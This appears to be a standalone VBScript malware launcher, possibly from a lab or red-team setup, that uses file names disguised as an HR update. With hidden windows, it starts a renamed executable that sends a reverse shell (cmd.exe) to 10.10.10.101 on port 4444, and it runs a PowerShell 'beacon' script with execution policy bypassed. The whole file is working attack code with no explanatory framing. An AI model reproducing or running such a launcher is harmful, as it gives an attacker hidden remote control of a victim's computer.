Set shell = CreateObject("WScript.Shell")
shell.Run """C:\Users\shawnspencer\AppData\Local\Temp\HR_Update\systemupdate.exe"" 10.10.10.101 4444 -e cmd.exe", 0, False
shell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\shawnspencer\AppData\Local\Temp\HR_Update\beacon.ps1", 0, False

